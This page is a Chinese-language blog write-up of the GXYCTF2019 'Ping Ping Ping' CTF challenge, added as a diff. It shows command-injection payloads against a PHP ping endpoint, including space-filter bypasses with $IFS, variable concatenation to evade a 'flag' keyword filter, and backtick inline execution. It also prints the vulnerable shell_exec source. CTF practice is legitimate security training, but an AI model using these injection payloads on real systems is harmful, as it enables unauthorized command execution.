@@ -1,0 +1,179 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GXYCTF2019 Ping Ping Ping WP | T0mrvvi1b3t‘s blog</title><meta name="author" content="T0mrvvi1b3t"><meta name="copyright" content="T0mrvvi1b3t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="打开页面后提示&#x2F;?ip&#x3D;结合题目，猜测具有命令执行漏洞 get传入ip&#x3D;127.0.0.1|ls发现返回目录文件👇 123&#x2F;?ip&#x3D;flag.phpindex.php  尝试直接cat flag.php 12回显：&#x2F;?ip&#x3D; fxck your space!  看来空格是被ban了，空格被ban的话可用$IFS$1来代替空格（这里的1可以是任意数字">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GXYCTF2019 Ping Ping Ping WP">
+<meta property="og:url" content="http://t0mrvvi1b3t.top/2021/05/16/buu_Ping%20Ping%20Ping/index.html">
+<meta property="og:site_name" content="T0mrvvi1b3t‘s blog">
+<meta property="og:description" content="打开页面后提示&#x2F;?ip&#x3D;结合题目，猜测具有命令执行漏洞 get传入ip&#x3D;127.0.0.1|ls发现返回目录文件👇 123&#x2F;?ip&#x3D;flag.phpindex.php  尝试直接cat flag.php 12回显：&#x2F;?ip&#x3D; fxck your space!  看来空格是被ban了，空格被ban的话可用$IFS$1来代替空格（这里的1可以是任意数字">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.vim-cn.com/45/bd1adccf832acd50364b15196c8e4a196a7629.jpg">
+<meta property="article:published_time" content="2021-05-15T16:29:53.089Z">
+<meta property="article:modified_time" content="2021-05-15T17:07:44.184Z">
+<meta property="article:author" content="T0mrvvi1b3t">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.vim-cn.com/45/bd1adccf832acd50364b15196c8e4a196a7629.jpg"><link rel="shortcut icon" href="https://img.vim-cn.com/86/fc3fd860a6269f1834928642dd8462bc5b93be.jpg"><link rel="canonical" href="http://t0mrvvi1b3t.top/2021/05/16/buu_Ping%20Ping%20Ping/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":false,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-05-16 01:07:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://ss2.baidu.com/6ON1bjeh1BF3odCf/it/u=2706720867,592915881&amp;fm=27&amp;gp=0.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.vim-cn.com/45/bd1adccf832acd50364b15196c8e4a196a7629.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">T0mrvvi1b3t‘s blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GXYCTF2019 Ping Ping Ping WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-15T16:29:53.089Z" title="发表于 2021-05-16 00:29:53">2021-05-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-15T17:07:44.184Z" title="更新于 2021-05-16 01:07:44">2021-05-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">buuctf刷题记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="GXYCTF2019 Ping Ping Ping WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>
+
+
+
+<p>打开页面后提示<code>/?ip=</code>结合题目，猜测具有命令执行漏洞</p>
+<p>get传入<code>ip=127.0.0.1|ls</code>发现返回目录文件👇</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>
+
+<p>尝试直接<code>cat flag.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">回显：</span><br><span class="line">&#x2F;?ip&#x3D; fxck your space!</span><br></pre></td></tr></table></figure>
+
+<p>看来空格是被ban了，空格被ban的话可用<code>$IFS$1</code>来代替空格（这里的1可以是任意数字</p>
+<p>执行<code>cat$IFS$1flag.php</code>回显👇</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D; fxck your flag!</span><br></pre></td></tr></table></figure>
+
+<p><code>flag</code>关键词被ban了</p>
+<p>那就cat一下index.php（cat$IFS$1index.php</p>
+<p>得到源码👇（有一部分在注释里边</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到只要是带有f、l、a、g的都不行</p>
+<p>1、看到存在a变量，尝试对a变量重新赋值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;ag;cat$IFS$1fl$a.php</span><br></pre></td></tr></table></figure>
+
+<p>执行后在注释中即可看到flag</p>
+<p>2、尝试通过变量实现字符串拼接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat$IFS$1$b$a.php</span><br></pre></td></tr></table></figure>
+
+<p>3、内联执行（查看dalao的wp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure>
+
+<p>原理：将反引号内命令的输出再次输出执行</p>
+<p>关于<code>$IFS</code>：</p>
+<p>$IFS是bash中的内部域分隔符，后面的$9数字是可以随意的，每个数字都有特殊含义，但是和前面的搭配都可以表示空格</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geeksongs/p/13617095.html">【Linux】: 反引号 `` 的用法</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/loseheart157/article/details/108686471">shell命令之 IFS(内部分隔符的用法)</a></p>
+<p><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4345478/blog/4892099">Linux中的IFS分隔符变量应用</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">T0mrvvi1b3t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://t0mrvvi1b3t.top/2021/05/16/buu_Ping%20Ping%20Ping/">http://t0mrvvi1b3t.top/2021/05/16/buu_Ping%20Ping%20Ping/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://t0mrvvi1b3t.top" target="_blank">T0mrvvi1b3t‘s blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://img.vim-cn.com/45/bd1adccf832acd50364b15196c8e4a196a7629.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/05/15/ctfhub_.git/"><img class="next-cover" src="https://img.vim-cn.com/3f/c54086485380d4d25449c025f16cdddb40acf3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctfhub 技能树 .git泄露</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://ss2.baidu.com/6ON1bjeh1BF3odCf/it/u=2706720867,592915881&amp;fm=27&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">T0mrvvi1b3t</div><div class="author-info__description">i have a big dream.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50597969"><i class="fab fa-csdn"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:t0mrvvi1b3t@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客中所有含csdn水印的图片均来源于个人在csdn的博客，对应链接请点击Follow Me</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/05/16/buu_Ping%20Ping%20Ping/" title="GXYCTF2019 Ping Ping Ping WP"><img src="https://img.vim-cn.com/45/bd1adccf832acd50364b15196c8e4a196a7629.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GXYCTF2019 Ping Ping Ping WP"/></a><div class="content"><a class="title" href="/2021/05/16/buu_Ping%20Ping%20Ping/" title="GXYCTF2019 Ping Ping Ping WP">GXYCTF2019 Ping Ping Ping WP</a><time datetime="2021-05-15T16:29:53.089Z" title="发表于 2021-05-16 00:29:53">2021-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/15/ctfhub_.git/" title="ctfhub 技能树 .git泄露"><img src="https://img.vim-cn.com/3f/c54086485380d4d25449c025f16cdddb40acf3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfhub 技能树 .git泄露"/></a><div class="content"><a class="title" href="/2021/05/15/ctfhub_.git/" title="ctfhub 技能树 .git泄露">ctfhub 技能树 .git泄露</a><time datetime="2021-05-15T14:04:30.300Z" title="发表于 2021-05-15 22:04:30">2021-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/xctf_pwn_xin/" title="xctf-pwn-新手区 WP"><img src="https://img.vim-cn.com/3d/48adec9d1e7b25a568746c7170364bb4fcd896.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xctf-pwn-新手区 WP"/></a><div class="content"><a class="title" href="/2021/05/14/xctf_pwn_xin/" title="xctf-pwn-新手区 WP">xctf-pwn-新手区 WP</a><time datetime="2021-05-14T14:51:57.540Z" title="发表于 2021-05-14 22:51:57">2021-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/14/csictf-misc-panda/" title="csictf2020 panda wp"><img src="https://img.vim-cn.com/03/f06882dc544918ca6beb21150cd9963aba949b.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="csictf2020 panda wp"/></a><div class="content"><a class="title" href="/2021/05/14/csictf-misc-panda/" title="csictf2020 panda wp">csictf2020 panda wp</a><time datetime="2021-05-14T11:32:50.320Z" title="发表于 2021-05-14 19:32:50">2021-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/12/ctfshow_web_ru/" title="ctfshow_web入门  WP（未完）"><img src="https://img.vim-cn.com/3d/48adec9d1e7b25a568746c7170364bb4fcd896.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow_web入门  WP（未完）"/></a><div class="content"><a class="title" href="/2021/05/12/ctfshow_web_ru/" title="ctfshow_web入门  WP（未完）">ctfshow_web入门  WP（未完）</a><time datetime="2021-05-12T04:40:02.375Z" title="发表于 2021-05-12 12:40:02">2021-05-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By T0mrvvi1b3t</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
